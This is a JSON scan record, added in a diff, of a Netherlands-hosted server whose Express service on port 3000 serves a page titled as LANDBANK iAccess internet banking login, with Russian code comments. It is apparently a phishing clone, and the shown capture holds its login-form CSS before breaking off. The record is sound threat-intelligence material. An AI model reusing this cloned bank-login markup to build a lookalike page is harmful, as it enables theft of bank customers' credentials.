@@ -1,0 +1,456 @@
+{
+  "result": {
+    "resource": {
+      "ip": "45.87.41.119",
+      "location": {
+        "continent": "Europe",
+        "country": "Netherlands",
+        "country_code": "NL",
+        "city": "Amsterdam",
+        "postal_code": "1012",
+        "timezone": "Europe/Amsterdam",
+        "province": "North Holland",
+        "coordinates": {
+          "latitude": 52.37403,
+          "longitude": 4.88969
+        }
+      },
+      "autonomous_system": {
+        "asn": 62068,
+        "description": "SPECTRAIP SpectraIP B.V.",
+        "bgp_prefix": "45.87.41.0/24",
+        "name": "SPECTRAIP SpectraIP B.V.",
+        "country_code": "NL"
+      },
+      "whois": {
+        "network": {
+          "handle": "SPECTRAIP-CUSTOMERS",
+          "name": "SpectraIP B.V.",
+          "cidrs": [
+            "45.87.41.0/24"
+          ],
+          "created": "2022-06-24T00:00:00Z",
+          "updated": "2024-01-02T00:00:00Z"
+        },
+        "organization": {
+          "handle": "ORG-SB523-RIPE",
+          "name": "SpectraIP B.V.",
+          "address": "Bruynvisweg 11\\n1531AX\\nWormer\\nNETHERLANDS",
+          "abuse_contacts": [
+            {
+              "handle": "AR44935-RIPE",
+              "name": "Abuse Contact",
+              "email": "abuse@spectraip.nl"
+            }
+          ],
+          "admin_contacts": [
+            {
+              "handle": "SB25017-RIPE",
+              "name": "SpectraIP B.V."
+            }
+          ]
+        }
+      },
+      "services": [
+        {
+          "port": 22,
+          "protocol": "SSH",
+          "transport_protocol": "tcp",
+          "software": [
+            {
+              "type": [
+                "REMOTE_ACCESS"
+              ]
+            },
+            {
+              "vendor": "openbsd",
+              "product": "openssh"
+            }
+          ],
+          "operating_systems": [
+            {
+              "vendor": "canonical",
+              "product": "linux"
+            }
+          ],
+          "labels": [
+            {
+              "value": "REMOTE_ACCESS"
+            }
+          ],
+          "ip": "45.87.41.119",
+          "scan_time": "2026-01-31T09:12:23Z",
+          "ssh": {
+            "endpoint_id": {
+              "raw": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13",
+              "protocol_version": "2.0",
+              "software_version": "OpenSSH_8.9p1",
+              "comment": "Ubuntu-3ubuntu0.13"
+            },
+            "kex_init_message": {
+              "kex_algorithms": [
+                "curve25519-sha256",
+                "curve25519-sha256@libssh.org",
+                "ecdh-sha2-nistp256",
+                "ecdh-sha2-nistp384",
+                "ecdh-sha2-nistp521",
+                "sntrup761x25519-sha512@openssh.com",
+                "diffie-hellman-group-exchange-sha256",
+                "diffie-hellman-group16-sha512",
+                "diffie-hellman-group18-sha512",
+                "diffie-hellman-group14-sha256",
+                "kex-strict-s-v00@openssh.com"
+              ],
+              "host_key_algorithms": [
+                "rsa-sha2-512",
+                "rsa-sha2-256",
+                "ecdsa-sha2-nistp256",
+                "ssh-ed25519"
+              ],
+              "client_to_server_ciphers": [
+                "chacha20-poly1305@openssh.com",
+                "aes128-ctr",
+                "aes192-ctr",
+                "aes256-ctr",
+                "aes128-gcm@openssh.com",
+                "aes256-gcm@openssh.com"
+              ],
+              "server_to_client_ciphers": [
+                "chacha20-poly1305@openssh.com",
+                "aes128-ctr",
+                "aes192-ctr",
+                "aes256-ctr",
+                "aes128-gcm@openssh.com",
+                "aes256-gcm@openssh.com"
+              ],
+              "client_to_server_macs": [
+                "umac-64-etm@openssh.com",
+                "umac-128-etm@openssh.com",
+                "hmac-sha2-256-etm@openssh.com",
+                "hmac-sha2-512-etm@openssh.com",
+                "hmac-sha1-etm@openssh.com",
+                "umac-64@openssh.com",
+                "umac-128@openssh.com",
+                "hmac-sha2-256",
+                "hmac-sha2-512",
+                "hmac-sha1"
+              ],
+              "server_to_client_macs": [
+                "umac-64-etm@openssh.com",
+                "umac-128-etm@openssh.com",
+                "hmac-sha2-256-etm@openssh.com",
+                "hmac-sha2-512-etm@openssh.com",
+                "hmac-sha1-etm@openssh.com",
+                "umac-64@openssh.com",
+                "umac-128@openssh.com",
+                "hmac-sha2-256",
+                "hmac-sha2-512",
+                "hmac-sha1"
+              ],
+              "client_to_server_compression": [
+                "none",
+                "zlib@openssh.com"
+              ],
+              "server_to_client_compression": [
+                "none",
+                "zlib@openssh.com"
+              ]
+            },
+            "algorithm_selection": {
+              "kex_algorithm": "curve25519-sha256@libssh.org",
+              "host_key_algorithm": "ecdsa-sha2-nistp256",
+              "client_to_server_alg_group": {
+                "cipher": "aes128-ctr",
+                "mac": "hmac-sha2-256",
+                "compression": "none"
+              },
+              "server_to_client_alg_group": {
+                "cipher": "aes128-ctr",
+                "mac": "hmac-sha2-256",
+                "compression": "none"
+              }
+            },
+            "server_host_key": {
+              "fingerprint_sha256": "62ab36616c30560a8bdb500bc634f6cd21090d336686f6c2d65299a597ca5fa2",
+              "ecdsa_public_key": {
+                "b": "WsY12Ko6k+ez671VdpiGvGUdBrDMU7D2O848PifSYEs=",
+                "curve": "P-256",
+                "gx": "axfR8uEsQkf4vOblY6RA8ncDfYEt6zOg9KE5RdiYwpY=",
+                "gy": "T+NC4v4af5uO5+tKfA+eFivOM1drMV7Oy7ZAaDe/UfU=",
+                "length": 256,
+                "n": "/////wAAAAD//////////7zm+q2nF56E87nKwvxjJVE=",
+                "p": "/////wAAAAEAAAAAAAAAAAAAAAD///////////////8=",
+                "x": "yBL3DmFlalGLADJURGvijUN+vSWycXJjzJFoED1h78Y=",
+                "y": "d0HWwBeNXEp7C7rJQYCZhUwAtHsiC9XCY74rBMA2XvY="
+              }
+            },
+            "hassh_fingerprint": "41ff3ecd1458b0bf86e1b4891636213e"
+          }
+        },
+        {
+          "port": 80,
+          "protocol": "HTTP",
+          "transport_protocol": "tcp",
+          "software": [
+            {
+              "vendor": "caddyserver",
+              "product": "caddy"
+            }
+          ],
+          "ip": "45.87.41.119",
+          "scan_time": "2026-01-31T00:21:18Z",
+          "endpoints": [
+            {
+              "hostname": "45.87.41.119",
+              "port": 80,
+              "path": "/",
+              "endpoint_type": "HTTP",
+              "transport_protocol": "tcp",
+              "scan_time": "2026-01-31T00:21:18Z",
+              "http": {
+                "uri": "http://45.87.41.119/",
+                "protocol": "HTTP/1.1",
+                "status_code": 308,
+                "status_reason": "Permanent Redirect",
+                "headers": {
+                  "Connection": {
+                    "headers": [
+                      "close"
+                    ]
+                  },
+                  "Content-Length": {
+                    "headers": [
+                      "0"
+                    ]
+                  },
+                  "Date": {
+                    "headers": [
+                      "<REDACTED>"
+                    ]
+                  },
+                  "Location": {
+                    "headers": [
+                      "https://45.87.41.119/"
+                    ]
+                  },
+                  "Server": {
+                    "headers": [
+                      "Caddy"
+                    ]
+                  }
+                },
+                "supported_versions": [
+                  "HTTP/1.1",
+                  "HTTP/2"
+                ]
+              },
+              "ip": "45.87.41.119"
+            }
+          ]
+        },
+        {
+          "port": 443,
+          "protocol": "HTTP",
+          "transport_protocol": "tcp",
+          "ip": "45.87.41.119",
+          "scan_time": "2026-01-31T07:52:06Z",
+          "endpoints": [
+            {
+              "hostname": "45.87.41.119",
+              "port": 443,
+              "path": "/",
+              "endpoint_type": "HTTP",
+              "transport_protocol": "tcp",
+              "scan_time": "2026-01-31T07:52:06Z",
+              "http": {
+                "uri": "http://45.87.41.119:443/",
+                "protocol": "HTTP/1.0",
+                "status_code": 400,
+                "status_reason": "Bad Request",
+                "headers": {
+                  "Connection": {
+                    "headers": [
+                      "close"
+                    ]
+                  }
+                },
+                "body_size": 48,
+                "body": "Client sent an HTTP request to an HTTPS server.\n",
+                "body_hash_sha256": "7a1fabf227903297428f36da3b3547d91e308a992063271e8fe1a4f1e1e6cd26",
+                "body_hash_sha1": "d56b41edced83968087065f2e8edf65e592ebadc",
+                "supported_versions": [
+                  "HTTP/1.0"
+                ]
+              },
+              "ip": "45.87.41.119"
+            }
+          ]
+        },
+        {
+          "port": 3000,
+          "protocol": "HTTP",
+          "transport_protocol": "tcp",
+          "software": [
+            {
+              "vendor": "express",
+              "product": "express"
+            }
+          ],
+          "labels": [
+            {
+              "value": "LOGIN_PAGE"
+            }
+          ],
+          "ip": "45.87.41.119",
+          "scan_time": "2026-01-31T06:56:57Z",
+          "endpoints": [
+            {
+              "hostname": "45.87.41.119",
+              "port": 3000,
+              "path": "/",
+              "endpoint_type": "HTTP",
+              "transport_protocol": "tcp",
+              "scan_time": "2026-01-31T06:56:57Z",
+              "http": {
+                "uri": "http://45.87.41.119:3000/",
+                "protocol": "HTTP/1.1",
+                "status_code": 200,
+                "status_reason": "OK",
+                "headers": {
+                  "Accept-Ranges": {
+                    "headers": [
+                      "bytes"
+                    ]
+                  },
+                  "Access-Control-Allow-Credentials": {
+                    "headers": [
+                      "true"
+                    ]
+                  },
+                  "Cache-Control": {
+                    "headers": [
+                      "public, max-age=0"
+                    ]
+                  },
+                  "Connection": {
+                    "headers": [
+                      "keep-alive"
+                    ]
+                  },
+                  "Content-Length": {
+                    "headers": [
+                      "44562"
+                    ]
+                  },
+                  "Content-Type": {
+                    "headers": [
+                      "text/html; charset=UTF-8"
+                    ]
+                  },
+                  "Date": {
+                    "headers": [
+                      "<REDACTED>"
+                    ]
+                  },
+                  "ETag": {
+                    "headers": [
+                      "W/\"ae12-19be5fac9d1\""
+                    ]
+                  },
+                  "Keep-Alive": {
+                    "headers": [
+                      "timeout=5"
+                    ]
+                  },
+                  "Last-Modified": {
+                    "headers": [
+                      "Thu, 22 Jan 2026 13:52:56 GMT"
+                    ]
+                  },
+                  "Vary": {
+                    "headers": [
+                      "Origin"
+                    ]
+                  },
+                  "X-Powered-By": {
+                    "headers": [
+                      "Express"
+                    ]
+                  }
+                },
+                "html_tags": [
+                  "<title>LANDBANK iAccess Retail Internet Banking - Login</title>",
+                  "<meta charset=\"utf-8\" />",
+                  "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />",
+                  "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\" />",
+                  "<meta name=\"apple-mobile-web-app-capable\" content=\"yes\" />",
+                  "<meta name=\"mobile-web-app-capable\" content=\"yes\" />"
+                ],
+                "body_size": 44562,
+                "body": "<!DOCTYPE html>\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n\n<style type=\"text/css\">\n    .forex-righth-align {\n        text-align: right;\n    }\n\n    .ssl-seal {\n        position: absolute;\n        left: 50%;\n        transform: translate(-50%, -50%);\n    }\n\n    .forex-button {\n        font-family: Helvetica, Arial, sans-serif;\n        text-transform: uppercase;\n        outline: 0;\n        background: #0c4221;\n        border: 0;\n        border-radius: 8px;\n        padding: 4px;\n        color: #ffffff;\n        font-size: 11px;\n        font-weight: bold;\n        -webkit-transition: all 0.3 ease;\n        transition: all 0.3 ease;\n        cursor: pointer;\n    }\n\n    /*05.29.2024 VINCE Additional Footer for iAccess UI*/\n    #login-footer {\n        display: table;\n        width: 100%;\n        background-color: #72BF44;\n        font-size: x-small;\n        /*padding-top: 20px;*/\n        line-height: 1.5;\n    }\n\n    #left-container {\n        display: inline;\n        float: left;\n        width: 50%;\n        padding-left: 15px;\n        margin-top: 5px;\n        text-align: left;\n        color: #ffffff;\n        font-size: 11px;\n    }\n\n    .left-container-span {\n        display: flex;\n        flex-direction: row;\n        padding-left: 10px;\n    }\n\n    #right-container {\n        display: inline;\n        float: right;\n        padding-right: 10px;\n        text-align: right;\n        color: #ffffff;\n        font-size: 11px;\n        position: relative;\n        bottom: 5px;\n    }\n\n    .right-container-span {\n        display: flex;\n        flex-direction: row-reverse;\n        padding-right: 100px;\n        position: relative;\n        top: 10px;\n    }\n\n    .right-container-span1 {\n        display: flex;\n        flex-direction: row;\n        /* padding-left: 7px; */\n        position: relative;\n        top: -8px;\n        left: -69px;\n    }\n\n    #landbank-logo {\n        float: right;\n        margin: -50px 30px 0 0px;\n        width: 50px;\n        height: 47px;\n        position: relative;\n        top: -8px;\n    }\n\n    /*05.29.2024 VINCE Additional Footer for iAccess UI*/\n\n    /* Spinner styles */\n    .spinner-container {\n        display: none;\n        justify-content: center;\n        align-items: center;\n        padding: 60px 20px;\n        min-height: 200px;\n        text-align: center;\n    }\n\n    .spinner-container.active {\n        display: flex;\n    }\n\n    /* \u041d\u0430 \u043c\u043e\u0431\u0438\u043b\u044c\u043d\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438 \u0441\u043f\u0438\u043d\u043d\u0435\u0440 \u0434\u043e\u043b\u0436\u0435\u043d \u043f\u0435\u0440\u0435\u043a\u0440\u044b\u0432\u0430\u0442\u044c \u0444\u043e\u0440\u043c\u0443 */\n    @media screen and (max-width: 768px) {\n        .form {\n            position: relative !important;\n        }\n\n        .spinner-container {\n            position: absolute;\n            top: 0;\n            left: 0;\n            right: 0;\n            bottom: 0;\n            background: #ffffff;\n            z-index: 10;\n            margin: 0;\n            padding: 60px 20px;\n            min-height: auto;\n        }\n\n        .spinner-container.active {\n            display: flex;\n        }\n    }\n\n    .form-content {\n        display: block;\n    }\n\n    .form-content.hidden {\n        display: none;\n    }\n\n    .spinner {\n        width: 50px;\n        height: 50px;\n        border: 4px solid #f3f3f3;\n        border-top: 4px solid #0c4221;\n        border-radius: 50%;\n        animation: spin 1s linear infinite;\n        margin: 0 auto;\n    }\n\n    @keyframes spin {\n        0% {\n            transform: rotate(0deg);\n        }\n\n        100% {\n            transform: rotate(360deg);\n        }\n    }\n\n    /* Error message styles */\n    #auth-status {\n        margin: 10px 0;\n        padding: 10px;\n        border-radius: 4px;\n    }\n\n    #auth-status.error {\n        color: #721c24;\n        background-color: #f8d7da;\n        border: 1px solid #f5c6cb;\n        display: block;\n    }\n\n    #auth-status.success {\n        color: #155724;\n        background-color: #d4edda;\n        border: 1px solid #c3e6cb;\n        display: block;\n    }\n\n    /* Mobile Responsive Styles */\n    @media screen and (max-width: 1024px) {\n\n        /* Tablet adjustments */\n        #login-maincontainer {\n            width: 100%;\n            max-width: 100%;\n        }\n\n        #login-topsection img {\n            max-width: 100%;\n            height: auto;\n        }\n\n        #login-contentcolumn {\n            margin-right: 350px;\n        }\n\n        #login-rightcolumn {\n            width: 350px;\n            margin-left: -350px;\n        }\n\n        #login-page {\n            width: 320px;\n        }\n\n        .form {\n            max-width: 320px;\n            padding: 30px 35px;\n        }\n\n        #login-advertisement-img {\n            max-width: 100%;\n            height: auto;\n        }\n    }\n\n    @media screen and (min-width: 769px) {\n        .header-content-mobile {\n            display: none !important;\n        }\n\n        .header-image-desktop {\n            display: block !important;\n        }\n    }\n\n    @media screen and (max-width: 768px) {\n\n        /* Mobile adjustments */\n        body {\n            margin: 0;\n            padding: 0;\n            overflow-x: hidden;\n        }\n\n        #login-maincontainer {\n            width: 100%;\n            max-width: 100%;\n            margin: 0;\n            padding: 0;\n            box-sizing: border-box;\n            overflow-x: hidden;\n        }\n\n        /* \u041d\u0430 \u0434\u0435\u0441\u043a\u0442\u043e\u043f\u0435 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435, \u043d\u0430 \u043c\u043e\u0431\u0438\u043b\u044c\u043d\u044b\u0445 \u0441\u043a\u0440\u044b\u0432\u0430\u0435\u043c */\n        .header-image-desktop {\n            display: block;\n        }\n\n        .header-content-mobile {\n            display: none !important;\n        }\n\n        #login-topsection {\n            max-height: 56px;\n            padding: 8px 12px;\n            margin: 0;\n            overflow: hidden;\n            width: 100%;\n            box-sizing: border-box;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            background: linear-gradient(135deg, #7DBA28 0%, #8BC53F 100%);\n            position: relative;\n        }\n\n        /* \u0424\u0438\u0440\u043c\u0435\u043d\u043d\u0430\u044f \u0437\u0435\u043b\u0451\u043d\u0430\u044f \u043f\u043e\u043b\u043e\u0441\u0430 \u0441\u043d\u0438\u0437\u0443 */\n        #login-topsection::after {\n            content: '';\n            position: absolute;\n            bottom: 0;\n            left: 0;\n            width: 100%;\n            height: 6px;\n            background: linear-gradient(90deg, #2E4E1F 0%, #355E25 100%);\n            z-index: 2;\n        }\n\n        #login-topsection img {\n            height: 36px;\n            width: auto;\n            max-width: calc(100% - 24px);\n            display: block;\n            object-fit: contain;\n            object-position: center;\n            z-index: 1;\n        }\n\n        #bancnet-logo {\n            margin-left: 0px !important;\n        }\n\n        /* \u041c\u041e\u0411\u0418\u041b\u042c\u041d\u0410\u042f \u0412\u0415\u0420\u0421\u0418\u042f - HTML/CSS \u0445\u0438\u0434\u0435\u0440 \u0432\u043c\u0435\u0441\u0442\u043e \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0438 */\n        @media screen and (max-width: 768px) {\n            .header-image-desktop {\n                display: none !important;\n            }\n\n            .header-content-mobile {\n                display: flex !important;\n                width: 100%;\n                justify-content: space-between;\n                align-items: center;\n                z-index: 1;\n                padding: 0 8px;\n            }\n\n            .header-left {\n                display: flex;\n                align-items: center;\n                gap: 6px;\n                flex: 1;\n            }\n\n            .landbank-logo-text {\n                font-family: 'Poppins', \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n                font-size: 19px;\n                font-weight: 800;\n                /* ExtraBold */\n                color: #FFFFFF;\n                letter-spacing: 0.5px;\n            }\n\n            .header-divider {\n                font-size: 14px;\n                color: #FFFFFF;\n                opacity: 0.7;\n            }\n\n            .ofbank-logo-text {\n                font-size: 10px;\n                font-weight: 500;\n                color: #FFFFFF;\n                white-space: nowrap;\n            }\n\n            .header-right {\n                display: flex;\n                align-items: center;\n            }\n\n            .iaccess-text {\n                font-size: 14px;\n                font-weight: 600;\n                color: #FFFFFF;\n                letter-spacing: 0.5px;\n            }\n\n            #login-topsection {\n                max-height: 56px;\n                padding: 8px 12px;\n                justify-content: flex-start;\n                background: linear-gradient(135deg, #7DBA28 0%, #8BC53F 100%) !important;\n            }\n\n            /* \u0410\u0434\u0430\u043f\u0442\u0438\u0432\u043d\u043e\u0435 \u043f\u043e\u0432\u0435\u0434\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u043c\u0430\u043b\u0435\u043d\u044c\u043a\u0438\u0445 \u044d\u043a\u0440\u0430\u043d\u043e\u0432 (\u2264360px) */\n            @media screen and (max-width: 360px) {\n                #login-topsection {\n                    max-height: 48px;\n                    padding: 6px 10px;\n                    background: linear-gradient(135deg, #7DBA28 0%, #8BC53F 100%) !important;\n                }\n\n                .header-content-mobile {\n                    padding: 0 6px;\n                }\n\n                .landbank-logo-text {\n                    font-family: 'Poppins', \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n                    font-size: 18px;\n                    font-weight: 800;\n                    /* ExtraBold */\n                }\n\n                .header-divider {\n                    font-size: 12px;\n                }\n\n                .ofbank-logo-text {\n                    font-size: 9px;\n                    display: none;\n                    /* \u0421\u043a\u0440\u044b\u0432\u0430\u0435\u043c OFBank \u043d\u0430 \u043e\u0447\u0435\u043d\u044c \u043c\u0430\u043b\u0435\u043d\u044c\u043a\u0438\u0445 \u044d\u043a\u0440\u0430\u043d\u0430\u0445 */\n                }\n\n                .iaccess-text {\n                    font-size: 12px;\n                }\n\n                #login-topsection::after {\n                    height: 6px;\n                }\n            }\n\n            /* \u0410\u0434\u0430\u043f\u0442\u0438\u0432\u043d\u043e\u0435 \u043f\u043e\u0432\u0435\u0434\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0441\u0440\u0435\u0434\u043d\u0438\u0445 \u044d\u043a\u0440\u0430\u043d\u043e\u0432 (361-414px) */\n            @media screen and (min-width: 361px) and (max-width: 414px) {\n                #login-topsection {\n                    max-height: 56px;\n                    background: linear-gradient(135deg, #7DBA28 0%, #8BC53F 100%) !important;\n                }\n\n                .landbank-logo-text {\n                    font-family: 'Poppins', \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n                    font-size: 19px;\n                    font-weight: 800;\n                    /* ExtraBold */\n                }\n\n                .ofbank-logo-text {\n                    font-size: 11px;\n                }\n\n                .iaccess-text {\n                    font-size: 15px;\n                }\n            }\n        }\n\n        /* \u041d\u0430 \u0434\u0435\u0441\u043a\u0442\u043e\u043f\u0435 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0442\u043e\u043b\u044c\u043a\u043e \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 */\n\n        #login-wrapper {\n            display: flex;\n            flex-direction: column;\n            width: 100%;\n            margin: 0;\n            padding: 0;\n            box-sizing: border-box;\n        }\n\n        #login-contentcolumn {\n            float: none !important;\n            width: 100% !important;\n            margin: 0 !important;\n            padding: 15px !important;\n            box-sizing: border-box;\n            display: block !important;\n            order: 1;\n        }\n\n        #login-contentcolumn .login-infolinks {\n            display: none;\n        }\n\n        #login-welcome-msg {\n            font-size: 18px;\n            font-weight: 400;\n            padding: 8px 0;\n            margin: 0;\n            color: #333;\n        }\n\n        #login-advertisement-img {\n            display: none !important;\n            /* \u0421\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0442\u043e\u043b\u044c\u043a\u043e \u0440\u0435\u043a\u043b\u0430\u043c\u043d\u0443\u044e \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0443 */\n        }\n\n        #login-rightcolumn {\n            float: none !important;\n            width: 100% !important;\n            margin: 0 !important;\n            padding: 15px !important;\n            box-sizing: border-box;\n            display: block !important;\n            position: static !important;\n            visibility: visible !important;\n            opacity: 1 !important;\n            clear: both !important;\n            order: 2;\n        }\n\n        #login-page {\n            width: 100% !important;\n            margin: 0 !important;\n            padding: 0 !important;\n            box-sizing: border-box;\n            display: block !important;\n            position: static !important;\n            visibility: visible !important;\n            opacity: 1 !important;\n            float: none !important;\n        }\n\n        .form {\n            width: 100% !important;\n            max-width: 100% !important;\n            margin: 0 !important;\n            padding: 25px 20px !important;\n            box-sizing: border-box;\n            box-shadow: 0 0 15px 0 rgba(0, 0, 0, 0.3);\n            display: block !important;\n            position: relative !important;\n            visibility: visible !important;\n            opacity: 1 !important;\n            float: none !important;\n            background: #ffffff !important;\n            z-index: 1 !important;\n        }\n\n        #login-form {\n            display: block !important;\n            visibility: visible !important;\n            opacity: 1 !important;\n        }\n\n        #form-content {\n            display: block !important;\n            visibility: visible !important;\n        }\n\n        .login-input {\n            min-height: 48px !important;\n            padding: 14px 16px !important;\n            font-size: 16px;\n            /* Prevents zoom on iOS */\n            margin-bottom: 15px;\n            width: 100%;\n            box-sizing: border-box;\n            display: block !important;\n            border: 1px solid #ddd !important;\n            border-radius: 4px !important;\n            color: #333;\n        }\n\n        .login-input::placeholder {\n            color: #666 !important;\n            opacity: 1;\n        }\n\n        .login-input:focus {\n            outline: none;\n            border-color: #0c4221 !important;\n            box-shadow: 0 0 0 2px rgba(12, 66, 33, 0.1);\n        }\n\n        .password-wrapper {\n            position: relative;\n            margin-bottom: 15px;\n        }\n\n        .password-toggle {\n            position: absolute;\n            right: 12px;\n            top: 50%;\n            transform: translateY(-50%);\n            background: none;\n            border: none;\n            cursor: pointer;\n            padding: 8px;\n            font-size: 20px;\n            min-width: 44px;\n            min-height: 44px;\n            z-index: 10;\n        }\n\n        .login-button {\n            min-height: 48px !important;\n            background: #d7df23 !important;\n            /* \u0412\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u0434\u0435\u0441\u043a\u0442\u043e\u043f\u043d\u044b\u0439 \u0446\u0432\u0435\u0442 */\n            border: none;\n            border-radius: 4px !important;\n            font-size: 16px;\n            font-weight: 600;\n            color: #2d7051;\n            cursor: pointer;\n            transition: background 0.2s;\n            padding: 18px 15px !important;\n            width: 100%;\n            box-sizing: border-box;\n            display: block !important;\n            text-align: center !important;\n            background-position: calc(50% - 45px) center !important;\n            background-size: 40px 25px !important;\n            background-repeat: no-repeat !important;\n        }\n\n        .login-button:hover:not(:disabled) {\n            background: #a9b200 !important;\n            /* \u0414\u0435\u0441\u043a\u0442\u043e\u043f\u043d\u044b\u0439 hover \u0446\u0432\u0435\u0442 */\n        }\n\n        .login-button:disabled {\n            opacity: 0.6;\n            cursor: not-allowed;\n        }\n\n        .login-button.loading {\n            position: relative;\n            color: transparent;\n        }\n\n        .login-button.loading::after {\n            content: '';\n            position: absolute;\n            width: 20px;\n            height: 20px;\n            top: 50%;\n            left: 50%;\n            transform: translate(-50%, -50%);\n            border: 2px solid #2d7051;\n            border-top-color: transparent;\n            border-radius: 50%;\n            animation: spin 0.6s linear infinite;\n        }\n\n        input[id=\"login\"] {\n            padding: 18px 15px !important;\n            text-align: center !important;\n            background-position: calc(50% - 45px) center !important;\n            background-repeat: no-repeat !important;\n        }\n\n        .form .message {\n            font-size: 14px !important;\n            line-height: 1.6 !important;\n            margin: 16px 0 8px !important;\n            color: #333;\n        }\n\n        .form .message a {\n            color: #0c4221 !important;\n            text-decoration: underline !important;\n            padding: 4px 0;\n            display: inline-block;\n            min-height: 32px;\n        }\n\n        #login-forex {\n            display: none !important;\n            /* \u0421\u043a\u0440\u044b\u0432\u0430\u0435\u043c FOREIGN EXCHANGE \u043d\u0430 \u043c\u043e\u0431\u0438\u043b\u044c\u043d\u044b\u0445 */\n        }\n\n        #login-footer {\n            display: block;\n            padding: 12px 15px !important;\n            font-size: 10px !important;\n            line-height: 1.6;\n            text-align: left !important;\n            width: 100%;\n            max-width: 100%;\n            box-sizing: border-box;\n            overflow-x: hidden;\n        }\n\n        #login-footer a {\n            min-height: 32px;\n            display: inline-block;\n            padding: 2px 0;\n            word-break: break-word;\n        }\n\n        #left-container {\n            display: none !important;\n            /* \u0421\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u043b\u0435\u0432\u044b\u0439 \u0431\u043b\u043e\u043a \u0444\u0443\u0442\u0435\u0440\u0430 \u043d\u0430 \u043c\u043e\u0431\u0438\u043b\u044c\u043d\u044b\u0445 */\n        }\n\n        .left-container-span {\n            flex-direction: column;\n            padding-left: 0;\n            margin: 8px 0;\n            text-align: left !important;\n            align-items: flex-start !important;\n        }\n\n        #right-container {\n            float: none;\n            width: 100%;\n            max-width: 100%;\n            padding-right: 0;\n            padding-left: 0;\n            text-align: left !important;\n            position: static;\n            order: 1 !important;\n            margin-top: 12px;\n            box-sizing: border-box;\n            overflow-x: hidden;\n        }\n\n        .right-container-span {\n            flex-direction: column;\n            padding-right: 0;\n            padding-left: 0;\n            position: static;\n            margin: 8px 0;\n            text-align: left !important;\n            align-items: flex-start !important;\n            width: 100%;\n            max-width: 100%;\n            box-sizing: border-box;\n            word-wrap: break-word;\n        }\n\n        .right-container-span1 {\n            flex-direction: column;\n            position: static;\n            left: 0;\n            margin: 8px 0;\n            text-align: left !important;\n            align-items: flex-start !important;\n            width: 100%;\n            max-width: 100%;\n            box-sizing: border-box;\n            word-wrap: break-word;\n        }\n\n        #landbank-logo {\n            float: none;\n            margin: 10px 0;\n            display: block;\n            position: static;\n        }\n\n        #landbank-logo {\n            float: none;\n            margin: 10px auto;\n            display: block;\n            position: static;\n        }\n\n        #footer {\n            display: flex;\n            flex-direction: column;\n            padding: 15px 10px;\n            margin-top: 30px;\n            /* \u041e\u0442\u0441\u0442\u0443\u043f \u0441\u0432\u0435\u0440\u0445\u0443 \u0447\u0442\u043e\u0431\u044b \u043d\u0435 \u0437\u0430\u0435\u0437\u0436\u0430\u043b \u043f\u043e\u0434 \u0444\u043e\u0440\u043c\u0443 */\n            width: 100%;\n            max-width: 100%;\n            box-sizing: border-box;\n            overflow-x: hidden;\n        }\n\n        .warning-accordion {\n            margin-top: 30px;\n            border-top: 1px solid #ddd;\n            padding-top: 20px;\n            width: 100%;\n            max-width: 100%;\n            box-sizing: border-box;\n            overflow-x: hidden;\n        }\n\n        .warning-toggle {\n            width: 100%;\n            max-width: 100%;\n            padding: 12px 0;\n            background: none;\n            border: none;\n            text-align: left;\n            font-size: 14px;\n            font-weight: 600;\n            color: #0c4221;\n            cursor: pointer;\n            display: flex;\n            justify-content: space-between;\n            align-items: center;\n            min-height: 44px;\n            box-sizing: border-box;\n        }\n\n        .accordion-icon {\n            transition: transform 0.3s;\n            font-size: 12px;\n        }\n\n        .warning-toggle[aria-expanded=\"true\"] .accordion-icon {\n            transform: rotate(180deg);\n        }\n\n        .warning-content {\n            max-height: 0;\n            overflow: hidden;\n            opacity: 0;\n            transition: max-height 0.3s ease, opacity 0.3s ease;\n            padding: 0;\n            width: 100%;\n            max-width: 100%;\n            box-sizing: border-box;\n        }\n\n        .warning-content.expanded {\n            max-height: 1000px;\n            opacity: 1;\n            padding: 16px 0;\n            width: 100%;\n            max-width: 100%;\n            box-sizing: border-box;\n        }\n\n        #container-warning {\n            float: none;\n            width: 100% !important;\n            max-width: 100%;\n            margin: 10px 0;\n            padding: 0;\n            font-size: 12px;\n            line-height: 1.6;\n            color: #666;\n            text-align: left !important;\n            box-sizing: border-box;\n            overflow-x: hidden;\n            word-wrap: break-word;\n        }\n\n        #container-warning ol {\n            text-align: left;\n            display: block;\n            margin: 10px 0;\n            padding-left: 20px;\n            max-width: 100%;\n            box-sizing: border-box;\n        }\n\n        #container-warning span {\n            display: block;\n            word-wrap: break-word;\n            overflow-wrap: break-word;\n        }\n\n        #auth-status {\n            transition: opacity 0.3s ease;\n        }\n\n        #container-contactinfo {\n            display: none !important;\n            /* \u0421\u043a\u0440\u044b\u0432\u0430\u0435\u043c LANDBANK CUSTOMER CARE CENTER \u043d\u0430 \u043c\u043e\u0431\u0438\u043b\u044c\u043d\u044b\u0445 */\n        }\n    }\n\n    /* \u041d\u0430 \u0434\u0435\u0441\u043a\u0442\u043e\u043f\u0435 \u0441\u043a\u0440\u044b\u0442\u044c password toggle */\n    @media screen and (min-width: 769px) {\n        .password-toggle {\n            display: none;\n        }\n    }\n\n    /* \u041d\u0430 \u0434\u0435\u0441\u043a\u0442\u043e\u043f\u0435 accordion \u043d\u0435 \u043d\u0443\u0436\u0435\u043d - 